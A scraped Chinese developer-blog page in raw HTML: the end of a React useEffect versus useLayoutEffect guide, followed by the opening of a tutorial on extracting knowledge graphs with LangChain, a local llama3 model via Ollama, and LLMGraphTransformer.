<span class="hljs-keyword">function</span> <span class="hljs-title function_">PerformanceTest</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

  <span class="hljs-comment">// useEffect 不会阻塞渲染</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 即使这里做复杂计算，页面也能快速响应</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000000</span>; i++) {}
  }, [count]);

  <span class="hljs-comment">// useLayoutEffect 会阻塞渲染</span>
  <span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 这个计算会让点击按钮时出现明显延迟</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000000</span>; i++) {}
  }, [count]);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt;
      点击：{count}
    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// 结论：</span>
<span class="hljs-comment">// useEffect 按钮响应迅速</span>
<span class="hljs-comment">// useLayoutEffect 点击时会卡顿</span>
</code></pre>
<hr/>
<h3 data-id="heading-22">✅ 快速参考</h3>
<h4 data-id="heading-23">99% 情况用 useEffect</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 数据获取</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> { <span class="hljs-title function_">fetchData</span>(); }, []);

<span class="hljs-comment">// 事件监听</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> { 
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, handler);
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'resize'</span>, handler);
}, []);

<span class="hljs-comment">// 副作用通用场景</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> { <span class="hljs-title function_">doSomething</span>(); }, [dep]);
</code></pre>
<h4 data-id="heading-24">特殊场景用 useLayoutEffect</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// DOM 测量</span>
<span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> { 
  <span class="hljs-keyword">const</span> rect = ref.<span class="hljs-property">current</span>.<span class="hljs-title function_">getBoundingClientRect</span>();
  <span class="hljs-title function_">setHeight</span>(rect.<span class="hljs-property">height</span>);
}, []);

<span class="hljs-comment">// 焦点设置</span>
<span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> { 
  inputRef.<span class="hljs-property">current</span>?.<span class="hljs-title function_">focus</span>();
}, []);

<span class="hljs-comment">// 动画初始化</span>
<span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> { 
  gsap.<span class="hljs-title function_">set</span>(ref.<span class="hljs-property">current</span>, initialState);
  <span class="hljs-title function_">startAnimation</span>();
}, []);
</code></pre>
<hr/>
<h3 data-id="heading-25">🎓 总结</h3>



































<table><thead><tr><th>维度</th><th>useEffect</th><th>useLayoutEffect</th></tr></thead><tbody><tr><td><strong>何时用</strong></td><td>99% 的情况</td><td>需要同步 DOM 操作</td></tr><tr><td><strong>执行时机</strong></td><td>浏览器绘制后</td><td>浏览器绘制前</td></tr><tr><td><strong>是否阻塞</strong></td><td>不阻塞</td><td>会阻塞</td></tr><tr><td><strong>性能</strong></td><td>优秀</td><td>可能卡顿</td></tr><tr><td><strong>例子</strong></td><td>数据请求、事件监听</td><td>DOM 测量、焦点、动画</td></tr></tbody></table>
<p><strong>记住：优先用 useEffect，只有特殊场景才用 useLayoutEffect！</strong> 🎯</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[写给小白看的使用LangChain构建基于知识图谱的RAG系统实战教程]]></title>    <link>https://juejin.cn/post/7576026767372468243</link>    <guid>https://juejin.cn/post/7576026767372468243</guid>    <pubDate>2025-11-24T12:33:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576026767372468243" data-draft-id="7576108254604148779" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="写给小白看的使用LangChain构建基于知识图谱的RAG系统实战教程"/> <meta itemprop="keywords" content="Agent,LangChain,LLM"/> <meta itemprop="datePublished" content="2025-11-24T12:33:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AI大模型"/> <meta itemprop="url" content="https://juejin.cn/user/3817967696221534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            写给小白看的使用LangChain构建基于知识图谱的RAG系统实战教程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817967696221534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AI大模型
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T12:33:57.000Z" title="Mon Nov 24 2025 12:33:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读28分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote>
<p>在构建基于知识图谱的RAG系统或使用LangChain的智能体时，最大的挑战之一是从非结构化数据中准确提取节点和关系。特别是当使用较小的、量化的本地LLM时，这一点尤其困难，结果往往是AI系统表现不佳。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9dab3c1e84be4b6ab751b71a9adaa5ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592436&amp;x-signature=GUvid67vitHOFjlNaIk72Sbskro%3D" alt="" loading="lazy"/></p>
<p>LangChain提取功能的一个关键问题是它依赖严格的JSON解析，即使使用更大的模型或非常详细的提示模板，也可能失败。相比之下，BAML使用一种模糊解析（fuzzy parsing）方法，即使LLM的输出不是完美的JSON格式，也能成功提取数据。</p>
<p>在这篇博客中，我们将探讨在使用较小的量化模型时LangChain提取的局限性，并展示BAML如何将提取成功率从大约25%提升到超过99%。</p>
<p>所有代码都可以在这个GitHub仓库中找到：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FFareedKhan-dev%2Flangchain-graphrag-baml" target="_blank" title="https://github.com/FareedKhan-dev/langchain-graphrag-baml" ref="nofollow noopener noreferrer">github.com/FareedKhan-…</a></p>
<hr/>
<h2 data-id="heading-0">目录</h2>
<ul>
<li>初始化评估数据集</li>
<li>量化的小型LLaMA模型</li>
<li>基于LLMGraphTransformer的方法</li>
<li>理解LangChain的问题</li>
<li>改进提示能解决问题吗？</li>
<li>BAML的初始化和快速概览</li>
<li>将BAML与LangChain集成</li>
<li>运行BAML实验</li>
<li>使用Neo4j分析GraphRAG</li>
<li>查找和链接相似实体</li>
<li>使用Leiden算法进行社区检测</li>
<li>分析最终图谱结构</li>
<li>结论</li>
</ul>
<hr/>
<h2 data-id="heading-1">初始化评估数据集</h2>
<p>为了理解问题及其解决方案，我们需要一个评估数据集来进行多次测试，以了解BAML如何改进LangChain知识图谱。</p>
<p>我们将使用Tomasonjo的博客数据集，托管在GitHub上，先加载这些数据。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 导入pandas库用于数据操作和分析  </span>
<span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd  
  
<span class="hljs-comment"># 从GitHub上的CSV文件加载新闻文章数据集到pandas DataFrame  </span>
news = pd.read_csv(  
    <span class="hljs-string">"https://raw.githubusercontent.com/tomasonjo/blog-datasets/main/news_articles.csv"</span>  
)  
  
<span class="hljs-comment"># 显示DataFrame的前5行  </span>
news.head()
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0b1fc71a1264249a641d77453645e34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592436&amp;x-signature=qfGXc3vUeVMTclsHUAWLG%2B1AaKk%3D" alt="" loading="lazy"/></p>
<p>我们的DataFrame很简单（包含标题和文本，文本是新闻的描述）。我们还需要一列来存储每篇新闻文章文本对应的总token数。</p>
<p>为此，我们可以使用OpenAI的tiktoken库来计算token，方法很简单，用循环来处理数据集。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 导入tiktoken库来计算文本的token数  </span>
<span class="hljs-keyword">import</span> tiktoken  
  
<span class="hljs-comment"># 定义一个函数，计算给定字符串在指定模型中的token数  </span>
defnum_tokens_from_string(string: <span class="hljs-built_in">str</span>, model: <span class="hljs-built_in">str</span> = <span class="hljs-string">"gpt-4o"</span>) -&gt; <span class="hljs-built_in">int</span>:  
    <span class="hljs-string">"""返回文本字符串中的token数。"""</span>  
    <span class="hljs-comment"># 获取指定模型的编码  </span>
    encoding = tiktoken.encoding_for_model(model)  
    <span class="hljs-comment"># 将字符串编码为token并计数  </span>
    num_tokens = <span class="hljs-built_in">len</span>(encoding.encode(string))  
    <span class="hljs-comment"># 返回总token数  </span>
    <span class="hljs-keyword">return</span> num_tokens  
  
<span class="hljs-comment"># 在DataFrame中创建新列'tokens'  </span>
<span class="hljs-comment"># 计算每篇文章标题和文本组合的token数  </span>
news[<span class="hljs-string">"tokens"</span>] = [  
    num_tokens_from_string(<span class="hljs-string">f"<span class="hljs-subst">{row[<span class="hljs-string">'title'</span>]}</span> <span class="hljs-subst">{row[<span class="hljs-string">'text'</span>]}</span>"</span>)  
    <span class="hljs-keyword">for</span> i, row <span class="hljs-keyword">in</span> news.iterrows()  
]
</code></pre>
<p>计算DataFrame的token只需要几秒钟。</p>
<p>这是更新后的DataFrame。</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">显示DataFrame的前5行，展示新的<span class="hljs-string">'tokens'</span>列news.head()</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f19418bb4b24441a9a993f5704852995~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592436&amp;x-signature=6WqnpiV6vvTwwr5%2FDgNgxQchGB4%3D" alt="" loading="lazy"/></p>
<p>这些token将在后续的评估和分析阶段使用，因此我们进行了这一步。</p>
<hr/>
<h2 data-id="heading-2">量化的小型LLaMA模型</h2>
<p>为了将数据转换为知识图谱，我们将使用一个低级别量化的模型来进行严格的测试。</p>
<p>在生产环境中，开源LLM通常以量化形式部署，以降低成本和延迟。本博客使用LLaMA 3.1。</p>
<p>这里选择Ollama作为平台，但LangChain支持多种API和本地LLM提供商，可以选择任何合适的选项。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># ChatOllama是Ollama语言模型的接口  </span>
from langchain_ollama import ChatOllama  
  
<span class="hljs-comment"># 定义要使用的模型名称  </span>
<span class="hljs-attr">model</span> = <span class="hljs-string">"llama3"</span>  
  
<span class="hljs-comment"># 初始化ChatOllama语言模型  </span>
<span class="hljs-comment"># 'temperature'参数控制输出的随机性  </span>
<span class="hljs-comment"># 低值（如0.001）使模型的响应更确定  </span>
<span class="hljs-attr">llm</span> = ChatOllama(model=model, temperature=<span class="hljs-number">0.001</span>)
</code></pre>
<p>你还需要在系统上安装Ollama，它支持macOS、Windows和Linux。</p>
<p>访问Ollama官方网站：<a href="https://link.juejin.cn?target=https%3A%2F%2Follama.com%2F" target="_blank" title="https://ollama.com/" ref="nofollow noopener noreferrer">ollama.com/</a> 下载适合你操作系统的安装程序并按照说明安装。安装后，Ollama会作为后台服务运行。</p>
<p>在macOS和Windows上，应用程序应自动启动并在后台运行（你可能在菜单栏或系统托盘中看到一个图标）。在Linux上，你可能需要用<code>systemctl start ollama</code>手动启动。</p>
<p>要检查服务是否运行，打开终端或命令提示符并输入：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查可用模型ollama list</span>
</code></pre>
<h4 data-id="heading-3">输出</h4>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[ ]</span> &lt;-- No models
</code></pre>
<p>如果服务在运行但没有模型，你会看到一个空的模型列表，这在这个阶段是正常的。如果出现“command not found”错误，确保Ollama已正确安装。如果出现连接错误，说明服务器未运行。</p>
<p>你可以通过pull命令简单下载llama3模型。这需要一些时间和几GB的磁盘空间，因为模型很大。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 下载llama3模型ollama pull llama3</span>
</code></pre>
<p>这些命令完成后，再次运行<code>ollama list</code>，你应该能看到模型已列出。</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-comment"># 向本地Ollama API发送请求以生成文本  </span>
curl http://localhost:11434/api/generate \  
    <span class="hljs-comment"># 设置Content-Type头以指示JSON负载  </span>
    -H <span class="hljs-string">"Content-Type: application/json"</span> \  
    <span class="hljs-comment"># 提供请求数据  </span>
    -d '{  
        <span class="hljs-string">"model"</span>: <span class="hljs-string">"llama3"</span>,  
        <span class="hljs-string">"prompt"</span>: <span class="hljs-string">"Why is the sky blue?"</span>  
    }'
</code></pre>
<h4 data-id="heading-4">输出</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>  
  <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"llama3"</span><span class="hljs-punctuation">,</span>  
  <span class="hljs-attr">"created_at"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2025-08-03T12:00:00Z"</span><span class="hljs-punctuation">,</span>  
  <span class="hljs-attr">"response"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"The sky appears blue be ... blue."</span><span class="hljs-punctuation">,</span>  
  <span class="hljs-attr">"done"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>  
<span class="hljs-punctuation">}</span>
</code></pre>
<p>如果成功，你会在终端看到一串JSON响应，确认服务器正在运行并能提供模型服务。</p>
<p>现在评估数据和LLM都准备好了，下一步是将数据转换以更好地理解LangChain中的问题。</p>
<hr/>
<h2 data-id="heading-5">基于LLMGraphTransformer的方法</h2>
<p>使用LangChain或LangGraph将原始或结构化数据转换为知识图谱的正确方法是使用它们提供的方法。最常见的方法之一是langchain_experimental库中的LLMGraphTransformer。</p>
<p>这个工具设计为一体化的解决方案：提供文本和LLM，它会处理提示和解析，返回图谱结构。</p>
<p>让我们看看它与本地llama3模型的表现如何。</p>
<p>首先，我们需要导入所有必要的组件。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 从LangChain的实验库中导入主要的图谱转换器  </span>
<span class="hljs-keyword">from</span> langchain_experimental.graph_transformers <span class="hljs-keyword">import</span> LLMGraphTransformer  
  
<span class="hljs-comment"># 导入图谱和文档的数据结构  </span>
<span class="hljs-keyword">from</span> langchain_community.graphs.graph_document <span class="hljs-keyword">import</span> GraphDocument, Node, Relationship  
<span class="hljs-keyword">from</span> langchain_core.documents <span class="hljs-keyword">import</span> Document
</code></pre>
<p>现在，初始化转换器。我们将使用之前创建的llm对象（即llama3模型）。</p>
<p>我们还需要告诉转换器我们希望为节点和关系提取哪些额外信息或“属性”。在这个例子中，我们只要求描述。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 使用llama3模型初始化LLMGraphTransformer  </span>
<span class="hljs-comment"># 指定我们希望节点和关系都有'description'属性  </span>
<span class="hljs-attr">llm_transformer</span> = LLMGraphTransformer(  
    <span class="hljs-attr">llm</span>=llm,  
    <span class="hljs-attr">node_properties</span>=[<span class="hljs-string">"description"</span>],  
    <span class="hljs-attr">relationship_properties</span>=[<span class="hljs-string">"description"</span>]  
)
</code></pre>
<p>为了让流程可重复且整洁，我们将创建一个简单的辅助函数。这个函数将接受一个文本字符串，将其包装成LangChain的Document格式，然后传递给llm_transformer以获取图谱结构。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 导入List类型用于类型提示  </span>
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>  
  
<span class="hljs-comment"># 定义一个函数，处理单个文本字符串并将其转换为图谱文档  </span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_text</span>(<span class="hljs-params">text: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">List</span>[GraphDocument]:  
    <span class="hljs-comment"># 从原始文本创建LangChain Document对象  </span>
    doc = Document(page_content=text)  
    <span class="hljs-comment"># 使用转换器将文档转换为图谱文档列表  </span>
    <span class="hljs-keyword">return</span> llm_transformer.convert_to_graph_documents([doc])
</code></pre>
<p>一切设置好后，是时候运行实验了。为了保持可管理性并突出核心问题，我们将处理数据集中的20篇文章样本。</p>
<p>我们将使用ThreadPoolExecutor并行运行处理，以加快工作流程。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 导入并发处理和进度条的库  </span>
from concurrent.futures import ThreadPoolExecutor, as_completed  
from tqdm import tqdm  
  
<span class="hljs-comment"># 设置并行工作者的数量和要处理的文章数量  </span>
<span class="hljs-attr">MAX_WORKERS</span> = <span class="hljs-number">10</span>  
<span class="hljs-attr">NUM_ARTICLES</span> = <span class="hljs-number">20</span>  
  
<span class="hljs-comment"># 这个列表将存储生成的图谱文档  </span>
<span class="hljs-attr">graph_documents</span> = []  
  
<span class="hljs-comment"># 使用ThreadPoolExecutor并行处理文章  </span>
with ThreadPoolExecutor(<span class="hljs-attr">max_workers</span>=MAX_WORKERS) as executor:  
    <span class="hljs-comment"># 为样本中的每篇文章提交处理任务  </span>
    <span class="hljs-attr">futures</span> = [  
        executor.submit(process_text, f<span class="hljs-string">"{row['title']} {row['text']}"</span>)  
        for i, row in news.head(NUM_ARTICLES).iterrows()  
    ]  
  
    <span class="hljs-comment"># 每当任务完成时，获取结果并添加到列表中  </span>
    for future in tqdm(  
        as_completed(futures), <span class="hljs-attr">total</span>=len(futures), desc=<span class="hljs-string">"处理文档"</span>  
    ):  
        <span class="hljs-attr">graph_document</span> = future.result()  
        graph_documents.extend(graph_document)
</code></pre>
<p>运行代码后，进度条显示所有20篇文章都已处理。</p>
<h4 data-id="heading-6">输出</h4>
<pre><code class="hljs language-bash" lang="bash">处理文档: 100%|██████████| 20/20 [01:32&lt;00:00,  4.64s/it]
</code></pre>
<hr/>
<h2 data-id="heading-7">理解LangChain的问题</h2>
<p>那么，我们得到了什么？让我们检查graph_documents列表。</p>
<pre><code class="hljs language-scss" lang="scss"># 显示图谱文档列表<span class="hljs-built_in">print</span>(graph_documents)
</code></pre>
<p>这是我们得到的输出：</p>
<h4 data-id="heading-8">输出</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[GraphDocument(nodes=[]</span>, <span class="hljs-attr">relationships</span>=[], source=Document(metadata={}, page_content=<span class="hljs-string">'XPeng Stock Rises...'</span>)),  
 GraphDocument(<span class="hljs-attr">nodes</span>=[], relationships=[], source=Document(metadata={}, page_content=<span class="hljs-string">'Ryanair sacks chief pilot...'</span>)),  
 GraphDocument(<span class="hljs-attr">nodes</span>=[], relationships=[], source=Document(metadata={}, page_content=<span class="hljs-string">'Dáil almost suspended...'</span>)),  
 GraphDocument(<span class="hljs-attr">nodes</span>=[Node(id=<span class="hljs-string">'Jude Bellingham'</span>, type=<span class="hljs-string">'Person'</span>, properties={}), Node(id=<span class="hljs-string">'Real Madrid'</span>, type=<span class="hljs-string">'Organization'</span>, properties={})], relationships=[], source=Document(metadata={}, page_content=<span class="hljs-string">'Arsenal have Rice bid rejected...'</span>)),  
 ...  
]
</code></pre>
<p>立刻就能看出问题。许多GraphDocument对象的节点和关系列表是空的。</p>
<p>这意味着对于这些文章，LLM要么生成了LangChain无法解析成有效图谱结构的输出，要么完全无法提取任何实体。</p>
<p>这就是使用较小的量化LLM进行结构化数据提取的核心挑战。它们往往难以遵循像LLMGraphTransformer这样的工具所期望的严格JSON格式。如果有一个小小的错误——比如多余的逗号、缺少引号——解析就会失败，我们什么也得不到。</p>
<p>让我们量化这个失败率。我们将统计20篇文档中有多少篇生成了空的图谱。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 初始化一个计数器，用于统计没有节点的文档  </span>
<span class="hljs-attr">empty_count</span> = <span class="hljs-number">0</span>  
  
<span class="hljs-comment"># 遍历生成的图谱文档  </span>
for doc in graph_documents:  
    <span class="hljs-comment"># 如果'nodes'列表为空，计数器加1  </span>
    if not doc.nodes:  
        empty_count += 1
</code></pre>
<p>现在，计算失败的百分比。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 计算并打印失败生成节点的文档百分比  </span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Percentage missing: <span class="hljs-subst">{empty_count/<span class="hljs-built_in">len</span>(graph_documents)*<span class="hljs-number">100</span>}</span>"</span>)
</code></pre>
<h4 data-id="heading-9">输出</h4>
<pre><code class="hljs language-r" lang="r">Percentage <span class="hljs-built_in">missing</span><span class="hljs-operator">:</span> <span class="hljs-number">75.0</span>
</code></pre>
